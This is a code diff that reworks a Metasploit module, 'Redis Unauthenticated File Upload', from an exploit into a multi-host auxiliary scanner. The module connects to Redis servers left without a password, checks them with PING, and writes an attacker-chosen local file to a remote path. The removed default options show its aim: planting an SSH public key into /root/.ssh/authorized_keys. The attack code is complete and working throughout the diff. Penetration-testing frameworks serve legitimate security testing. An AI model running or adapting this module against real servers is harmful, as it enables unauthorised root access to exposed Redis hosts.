@@ -5,43 +5,47 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Exploit::Remote
-  Rank = GoodRanking
-
+class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Redis Unauthenticated File Upload',
-      'Description'   => %q(
-        This module can save data to file in remote redis server,
-        Because redis is unprotected without a password set up.
-      ),
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Nixawk'],
-      'References'    => [
-        ['URL', 'http://antirez.com/news/96'],
-        ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
-        ['URL', 'http://redis.io/topics/protocol']
-      ],
-      'Platform'      => %w(unix linux),
-      'Targets'       => [['Automatic Target', { }]],
-      'Privileged'    => true,
-      'DefaultTarget' => 0,
-      'DisclosureDate' => 'Nov 11 2015'
-      ))
+    super(
+      update_info(
+        info,
+        'Name'          => 'Redis Unauthenticated File Upload',
+        'Description'   => %q(
+          This module can save data to file in remote redis server,
+          Because redis is unprotected without a password set up.
+        ),
+        'License'       => MSF_LICENSE,
+        'Author'        => ['Nixawk'],
+        'References'    => [
+          ['URL', 'http://antirez.com/news/96'],
+          ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
+          ['URL', 'http://redis.io/topics/protocol']
+        ],
+        'Platform'      => %w(unix linux),
+        'Targets'       => [['Automatic Target', {}]],
+        'Privileged'    => true,
+        'DefaultTarget' => 0,
+        'DisclosureDate' => 'Nov 11 2015'
+      )
+    )
     register_options(
       [
-        Opt::RHOST(),
         Opt::RPORT(6379),
-        OptPath.new('LocalFile', [true, 'Local file to be uploaded', '/root/.ssh/id_rsa.pub']),
-        OptString.new('RemoteFile', [true, 'Remote file path', '/root/.ssh/authorized_keys'])
-      ], self.class)
+        OptPath.new('LocalFile', [true, 'Local file to be uploaded']),
+        OptString.new('RemoteFile', [true, 'Remote file path'])
+      ]
+    )
 
     register_advanced_options(
       [
         OptInt.new('READ_TIMEOUT', [true, 'Seconds to wait while reading redis responses', 2])
-      ], self.class)
+      ]
+    )
   end
 
   def read_timeout
@@ -107,20 +111,28 @@ class Metasploit3 < Msf::Exploit::Remote
     end
   end
 
-  def exploit
-    begin
-      connect
-      res = send_command(['PING'])
+  def peer
+    "#{rhost}:#{rport}"
+  end
 
-      if res && res =~ /PONG/
-        content = "\n\n#{File.open(datastore['LocalFile']).read}\n\n\n"
-        send_file(datastore['RemoteFile'], content)
-      end
+  def setup
+    @upload_content = "\n\n#{IO.read(datastore['LocalFile'])}\n\n\n"
+  end
 
-    rescue ::Exception => e
-      print_error("Unable to connect: #{e}")
-    ensure
-      disconnect
+  def run_host(ip)
+    connect
+    unless (res = send_command(['PING']))
+      vprint_error("#{peer} -- did not respond to our redis PING")
+      return
     end
+
+    if res =~ /PONG/
+      vprint_good("#{peer} -- responded positively to our PONG")
+      send_file(datastore['RemoteFile'], @upload_content)
+    else
+      vprint_good("#{peer} -- responded unknown to our PONG: #{res}")
+    end
+  ensure
+    disconnect
   end
 end
